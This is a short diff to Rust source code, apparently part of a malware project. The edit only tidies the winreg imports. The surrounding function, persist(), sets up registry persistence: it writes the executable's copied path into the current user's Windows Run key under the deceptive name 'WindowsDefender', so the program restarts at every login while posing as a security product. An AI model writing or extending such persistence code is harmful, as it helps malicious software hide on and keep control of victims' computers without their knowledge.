@@ -1,5 +1,6 @@
-use winreg::enums::*;
+use winreg::enums::{*};
 use winreg::RegKey;
+use winreg::enums;
 use std::path::{Path, PathBuf};
 use std::env;
 use std::fs;
@@ -31,7 +32,7 @@ pub fn persist() -> std::io::Result<()> {
     }
 
     // Registry persistence
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
     let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")?;
 
     key.set_value("WindowsDefender", &target_path.to_string_lossy().to_string())?;
